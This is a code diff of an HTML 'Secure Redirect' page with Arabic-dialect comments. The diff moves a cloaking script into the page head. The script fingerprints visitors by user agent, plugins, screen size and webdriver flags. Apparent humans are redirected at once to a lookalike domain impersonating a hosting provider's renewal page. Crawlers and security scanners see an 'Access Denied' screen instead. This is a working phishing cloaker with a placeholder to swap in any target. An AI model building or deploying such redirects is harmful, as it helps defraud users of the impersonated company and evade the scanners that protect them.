@@ -4,17 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Redirect</title>
+    
+    <!-- Redirect فوري في الـ head -->
+    <script>
+        (function() {
+            // ========== CONFIGURATION ==========
+            const TARGET_URL = 'https://ventraip-renewal.com.au/privacy'; // ← CHANGE THIS TO YOUR TARGET URL
+
+            // ========== BOT DETECTION ==========
+            function isBot() {
+                const signatures = [
+                    'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
+                    'python', 'java', 'scrapy', 'phantomjs', 'selenium',
+                    'headless', 'puppeteer', 'playwright', 'webdriver'
+                ];
+
+                const ua = navigator.userAgent.toLowerCase();
+                const hasBotSignature = signatures.some(sig => ua.includes(sig));
+                
+                const checks = {
+                    noScreen: window.screen.width === 0 || window.screen.height === 0,
+                    noPlugins: navigator.plugins.length === 0,
+                    noLanguages: navigator.languages.length === 0,
+                    webdriver: navigator.webdriver === true
+                };
+
+                const suspiciousCount = Object.values(checks).filter(Boolean).length;
+                return hasBotSignature || suspiciousCount >= 2;
+            }
+
+            // ========== EXECUTE IMMEDIATELY ==========
+            if (!isBot()) {
+                // إنسان → Redirect فوري قبل ما يتحمل الـ body
+                window.location.replace(TARGET_URL);
+            }
+            // إذا بوت → يكمل يحمل الصفحة ويشوف الـ blocked message
+        })();
+    </script>
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
         :root {
-            --primary-blue: #1e3a8a;
-            --secondary-blue: #3b82f6;
-            --accent-cyan: #06b6d4;
             --dark-navy: #0f172a;
+            --primary-blue: #1e3a8a;
             --danger: #ef4444;
-            --gray-100: #f1f5f9;
-            --gray-800: #1e293b;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -27,7 +61,6 @@
             justify-content: center;
             align-items: center;
             color: white;
-            line-height: 1.6;
         }
 
         .container {
@@ -43,31 +76,30 @@
             padding: 48px;
             box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 2px solid var(--danger);
         }
 
         .logo {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, var(--secondary-blue), var(--accent-cyan));
+            background: linear-gradient(135deg, #ef4444, #dc2626);
             border-radius: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 32px;
             font-size: 36px;
-            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
         }
 
         h1 {
-            color: var(--gray-800);
+            color: #1e293b;
             font-size: 28px;
             font-weight: 700;
             margin-bottom: 12px;
         }
 
         .subtitle {
-            color: var(--gray-600);
+            color: #64748b;
             font-size: 16px;
             margin-bottom: 24px;
         }
@@ -76,26 +108,13 @@
             display: inline-flex;
             align-items: center;
             gap: 8px;
-            background: var(--gray-100);
+            background: #fef2f2;
             padding: 12px 24px;
             border-radius: 50px;
             font-size: 14px;
-            font-weight: 500;
-            color: var(--gray-800);
-            border: 2px solid var(--danger);
-        }
-
-        .blocked-card {
-            background: linear-gradient(135deg, #fef2f2, #fee2e2);
-            border: 2px solid var(--danger);
-        }
-
-        .blocked-card h1 {
+            font-weight: 600;
             color: var(--danger);
-        }
-
-        .hidden {
-            display: none !important;
+            border: 2px solid #fecaca;
         }
 
         @media (max-width: 640px) {
@@ -105,13 +124,10 @@
     </style>
 </head>
 <body>
-    <!-- Human: Redirect فوري (ما كيبانش هاد العنصر) -->
-    <div id="humanRedirect"></div>
-
-    <!-- Bot: يشوف هاد الصفحة -->
-    <div class="container hidden" id="blockedContainer">
-        <div class="card blocked-card">
-            <div class="logo" style="background: linear-gradient(135deg, #ef4444, #dc2626);">🚫</div>
+    <!-- يبان غير للبوت -->
+    <div class="container">
+        <div class="card">
+            <div class="logo">🚫</div>
             
             <h1>Access Denied</h1>
             <p class="subtitle">Suspicious activity detected</p>
@@ -122,45 +138,5 @@
             </div>
         </div>
     </div>
-
-    <script>
-        // ========== CONFIGURATION ==========
-        const TARGET_URL = 'https://ventraip-renewal.com.au/privacy'; // ← CHANGE THIS TO YOUR TARGET URL
-
-        // ========== BOT DETECTION ==========
-        function isBot() {
-            const signatures = [
-                'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget',
-                'python', 'java', 'scrapy', 'phantomjs', 'selenium',
-                'headless', 'puppeteer', 'playwright', 'webdriver'
-            ];
-
-            const ua = navigator.userAgent.toLowerCase();
-            const hasBotSignature = signatures.some(sig => ua.includes(sig));
-            
-            const checks = {
-                noScreen: window.screen.width === 0 || window.screen.height === 0,
-                noPlugins: navigator.plugins.length === 0,
-                noLanguages: navigator.languages.length === 0,
-                webdriver: navigator.webdriver === true
-            };
-
-            const suspiciousCount = Object.values(checks).filter(Boolean).length;
-            return hasBotSignature || suspiciousCount >= 2;
-        }
-
-        // ========== MAIN ==========
-        (function() {
-            const botDetected = isBot();
-
-            if (botDetected) {
-                // إظهار صفحة الحظر
-                document.getElementById('blockedContainer').classList.remove('hidden');
-            } else {
-                // إنسان → Redirect فوري فوري
-                window.location.replace(TARGET_URL);
-            }
-        })();
-    </script>
 </body>
 </html>
